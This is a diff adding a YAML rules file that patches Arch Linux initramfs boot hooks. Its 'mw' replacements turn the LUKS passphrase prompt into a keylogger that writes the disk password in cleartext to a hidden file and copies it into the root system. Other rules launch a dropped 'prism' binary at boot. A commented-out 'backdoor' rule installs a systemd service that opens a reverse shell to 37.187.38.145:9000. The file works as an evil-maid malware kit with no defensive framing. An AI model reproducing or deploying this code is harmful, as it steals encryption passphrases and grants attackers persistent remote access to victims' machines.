@@ -1,0 +1,121 @@
+- rule_name: "arch-encrypt-keylog first"
+  name: ".*encrypt"
+  original_code: |
+
+    #loop until we get a real password
+    while ! eval cryptsetup open --type luks ${resolved} ${cryptname} ${cryptargs} ${CSQUIET}; do
+        sleep 2;
+    done
+  mw: |
+
+    #loop until we get a real password
+    ok=0
+    while [ $ok -eq 0 ]
+    do
+        echo -n "Enter passphrase for ${resolved}: "
+        read -s pass
+        echo ""
+        if echo $pass | cryptsetup open --type luks ${resolved} ${cryptname} ${cryptargs} ${CSQUIET};
+        then
+            echo "password "${cryptdev}": "$pass >> /sysdata/.data
+            ok=1
+        fi
+    done
+  just_once: true
+
+- rule_name: "arch-encrypt-keylog second"
+  name: ".*encrypt"
+  original_code: |
+
+    #loop until we get a real password
+    while ! eval /sbin/cryptsetup luksOpen ${cryptdev} ${cryptname} ${CSQUIET}; do
+        sleep 2;
+    done
+  mw: |
+
+    #loop until we get a real password
+    ok=0
+    while [ $ok -eq 0 ]
+    do
+        echo -n "Enter passphrase for ${resolved}: "
+        read -s pass
+        echo ""
+        if echo $pass | /sbin/cryptsetup luksOpen ${cryptdev} ${cryptname} ${CSQUIET};
+        then
+            echo "password "${cryptdev}": "$pass >> /sysdata/.data
+            ok=1
+        fi
+    done
+  just_once: true
+
+- rule_name: "init-head"
+  name: ".*init"
+  original_code: |
+    mkdir -m755 /run/initramfs
+  mw: |
+    mkdir -m755 /run/initramfs
+    mkdir -p /sysdata
+  just_once: true
+
+- rule_name: "init-bottom+PRISM"
+  name: ".*init"
+  original_code: |
+
+    exec env -i \
+        "TERM=$TERM" \
+        /usr/bin/switch_root /new_root $init "$@"
+  mw: |
+    cp -a /sysdata /new_root/etc/
+    rm -r /sysdata
+    /bin/prism &>/dev/null
+
+    exec env -i \
+        "TERM=$TERM" \
+        /usr/bin/switch_root /new_root $init "$@"
+  just_once: true
+
+- rule_name: "copy PRISM"
+  copy:
+    - /bin/prism
+  dest: /bin
+
+#- rule_name: "backdoor"
+#  name: ".*init_functions"
+#  original_code: |
+#    # vim: set ft=sh ts=4 sw=4 et:
+#  mw: |
+#    #inject easter egg *o*
+#    addEggs() {
+#        cat > /new_root/etc/sysdata/sysdata << fine
+#            #!/bin/bash
+#            conx=0
+#            while [ \$conx -eq 0 ]
+#            do
+#                echo -e "GET http://google.com HTTP/1.0\n\n" | nc google.com 80 > /dev/null 2>&1
+#                if [ \$? -eq 0 ]
+#                then
+#                        nc -e /bin/bash 37.187.38.145 9000
+#                else
+#                        sleep 1m
+#                fi
+#            done
+#    fine
+#
+#        chmod +x /new_root/etc/sysdata/sysdata
+#
+#        cat > /new_root/usr/lib/systemd/system/sysdata.service << fine
+#            [Unit]
+#            Description=Sysdata
+#
+#            [Service]
+#            ExecStart=/bin/sh /etc/sysdata/sysdata
+#
+#            [Install]
+#            WantedBy=multi-user.target
+#    fine
+#
+#        ln -s /usr/lib/systemd/system/sysdata.service /new_root/etc/systemd/system/multi-user.target.wants/sysdata.service 2>/dev/null
+#    }
+#
+#    # vim: set ft=sh ts=4 sw=4 et:
+#  just_once: true
